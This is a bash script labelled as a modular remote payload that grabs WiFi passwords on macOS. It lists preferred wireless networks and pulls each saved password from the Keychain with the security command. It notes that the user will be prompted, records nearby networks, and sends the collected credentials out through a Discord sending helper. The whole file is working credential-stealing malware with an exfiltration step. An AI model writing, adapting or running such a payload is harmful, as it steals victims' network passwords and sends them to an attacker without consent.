#!/bin/bash
# ============================================================
# WiFi Password Grabber for macOS - Modular Remote Payload
# ============================================================
# Uses security command to extract WiFi passwords from Keychain
# Note: User will be prompted for password
# ============================================================

SYSID=$(get_sysid)
OUTPUT="🔐 **WiFi Passwords from $SYSID**\n"
OUTPUT+="📅 $(date '+%Y-%m-%d %H:%M:%S')\n"
OUTPUT+="========================================\n\n"

# Get list of known networks
NETWORKS=$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s 2>/dev/null | tail -n +2 | awk '{print $1}')

# Also get preferred networks
PREFERRED=$(networksetup -listpreferredwirelessnetworks en0 2>/dev/null | tail -n +2 | sed 's/^[ \t]*//')

OUTPUT+="**📶 Known Networks:**\n"
for ssid in $PREFERRED; do
    if [[ -n "$ssid" ]]; then
        # Try to get password (will prompt user)
        pass=$(security find-generic-password -wa "$ssid" 2>/dev/null)
        OUTPUT+="• **$ssid**"
        if [[ -n "$pass" ]]; then
            OUTPUT+=": \`$pass\`"
        else
            OUTPUT+=": (requires keychain access)"
        fi
        OUTPUT+="\n"
    fi
done

OUTPUT+="\n**📡 Available Networks:**\n"
echo "$NETWORKS" | head -10 | while read net; do
    OUTPUT+="• $net\n"
done

send_discord "$OUTPUT"

